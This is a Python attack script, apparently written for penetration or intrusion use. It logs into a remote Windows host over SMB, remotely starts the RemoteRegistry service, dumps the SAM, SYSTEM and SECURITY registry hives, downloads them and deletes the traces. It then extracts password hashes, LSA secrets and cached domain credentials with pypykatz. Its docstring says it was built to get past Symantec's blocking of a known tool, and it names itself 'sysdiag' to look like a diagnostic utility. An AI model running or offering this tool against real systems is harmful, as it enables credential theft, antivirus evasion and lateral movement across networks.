#!/usr/bin/env python3
"""Remote registry hive extraction and credential parsing
Uses impacket core libraries for remote registry + pypykatz for parsing
No dependency on impacket.examples.secretsdump (blocked by Symantec)
"""
import sys, os, tempfile
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, rrp, scmr

def enable_remote_registry(smb, host):
    """Start RemoteRegistry service if stopped"""
    rpctransport = transport.SMBTransport(host, 445, r'\svcctl', smb_connection=smb)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(scmr.MSRPC_UUID_SCMR)
    
    sc_handle = scmr.hROpenSCManagerW(dce)['lpScHandle']
    try:
        svc_handle = scmr.hROpenServiceW(dce, sc_handle, 'RemoteRegistry')['lpServiceHandle']
        resp = scmr.hRQueryServiceStatus(dce, svc_handle)
        if resp['lpServiceStatus']['dwCurrentState'] != 4:  # Not running
            scmr.hRStartServiceW(dce, svc_handle)
            print("[+] RemoteRegistry service started")
            return True
        print("[+] RemoteRegistry already running")
        return False
    except Exception as e:
        print(f"[-] RemoteRegistry error: {e}")
        return False

def save_hive(dce, hive_handle, hive_name, remote_path):
    """Save a registry hive to remote path"""
    try:
        key = rrp.hOpenLocalMachine(dce)['phKey'] if hive_name == 'SAM' or hive_name == 'SECURITY' or hive_name == 'SYSTEM' else None
        
        if hive_name == 'SAM':
            key = rrp.hOpenLocalMachine(dce)['phKey']
            sub = rrp.hBaseRegOpenKey(dce, key, 'SAM')['phkResult']
        elif hive_name == 'SECURITY':
            key = rrp.hOpenLocalMachine(dce)['phKey']
            sub = rrp.hBaseRegOpenKey(dce, key, 'SECURITY')['phkResult']
        elif hive_name == 'SYSTEM':
            key = rrp.hOpenLocalMachine(dce)['phKey']
            sub = rrp.hBaseRegOpenKey(dce, key, 'SYSTEM')['phkResult']
        
        rrp.hBaseRegSaveKey(dce, sub, remote_path)
        print(f"[+] {hive_name} saved to {remote_path}")
        return True
    except Exception as e:
        print(f"[-] Failed to save {hive_name}: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: sysdiag.py DOMAIN/user:password@target")
        sys.exit(1)
    
    target_str = sys.argv[1]
    
    # Parse credentials
    domain_user, target = target_str.rsplit('@', 1)
    if '/' in domain_user:
        domain, user_pass = domain_user.split('/', 1)
    else:
        domain = ''
        user_pass = domain_user
    
    if ':' in user_pass:
        username, password = user_pass.split(':', 1)
    else:
        username = user_pass
        password = ''
    
    print(f"[*] Target: {target}")
    print(f"[*] User: {domain}\\{username}")
    
    # Connect SMB
    smb = SMBConnection(target, target, timeout=10)
    smb.login(username, password, domain)
    print(f"[+] SMB connected")
    
    # Enable RemoteRegistry
    started = enable_remote_registry(smb, target)
    
    # Connect to remote registry
    rpctransport = transport.SMBTransport(target, 445, r'\winreg', smb_connection=smb)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(rrp.MSRPC_UUID_RRP)
    print("[+] Remote registry connected")
    
    # Read OS info
    try:
        hklm = rrp.hOpenLocalMachine(dce)['phKey']
        key = rrp.hBaseRegOpenKey(dce, hklm, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion')['phkResult']
        product = rrp.hBaseRegQueryValue(dce, key, 'ProductName')[1].rstrip('\x00')
        build = rrp.hBaseRegQueryValue(dce, key, 'CurrentBuildNumber')[1].rstrip('\x00')
        print(f"[+] OS: {product} (Build {build})")
    except:
        pass
    
    # Save hives to temp location on target
    tmp_dir = f'C:\\Windows\\Temp\\diag_{os.getpid()}'
    
    hives = {
        'SAM': f'{tmp_dir}_sam',
        'SYSTEM': f'{tmp_dir}_sys',
        'SECURITY': f'{tmp_dir}_sec'
    }
    
    saved = {}
    for hive_name, remote_path in hives.items():
        if save_hive(dce, hklm, hive_name, remote_path):
            saved[hive_name] = remote_path
    
    if not saved:
        print("[-] No hives saved, exiting")
        return
    
    # Download hives via SMB
    local_files = {}
    for hive_name, remote_path in saved.items():
        local_path = os.path.join(os.environ.get('TEMP', '.'), f'{hive_name.lower()}.hiv')
        try:
            # Remote path is C:\Windows\Temp\xxx - share is C$
            share_path = remote_path.replace('C:\\', '')
            with open(local_path, 'wb') as f:
                smb.getFile('C$', share_path, f.write)
            print(f"[+] Downloaded {hive_name} -> {local_path}")
            local_files[hive_name] = local_path
            # Cleanup remote file
            smb.deleteFile('C$', share_path)
        except Exception as e:
            print(f"[-] Download {hive_name} failed: {e}")
    
    # Parse with pypykatz
    if 'SAM' in local_files and 'SYSTEM' in local_files:
        print("\n[*] Parsing credentials with pypykatz...")
        try:
            from pypykatz.registry.offline_parser import OffineRegistry
            reg = OffineRegistry()
            reg.parse_system(local_files['SYSTEM'])
            reg.parse_sam(local_files['SAM'])
            if 'SECURITY' in local_files:
                reg.parse_security(local_files['SECURITY'])
            
            print("\n=== SAM Hashes ===")
            for user in reg.sam.users:
                print(f"  {user}")
            
            print("\n=== LSA Secrets ===")
            if hasattr(reg, 'security') and reg.security:
                for secret in reg.security.secrets:
                    print(f"  {secret}")
            
            print("\n=== Cached Credentials ===")
            if hasattr(reg, 'security') and reg.security:
                for cached in reg.security.cached_credentials:
                    print(f"  {cached}")
                    
        except Exception as e:
            print(f"[-] pypykatz parsing error: {e}")
            print("[*] Hive files saved locally for manual analysis:")
            for name, path in local_files.items():
                print(f"  {name}: {path}")
    
    # Cleanup
    for path in local_files.values():
        try:
            os.remove(path)
        except:
            pass
    
    print("\n[+] Done")

if __name__ == '__main__':
    main()
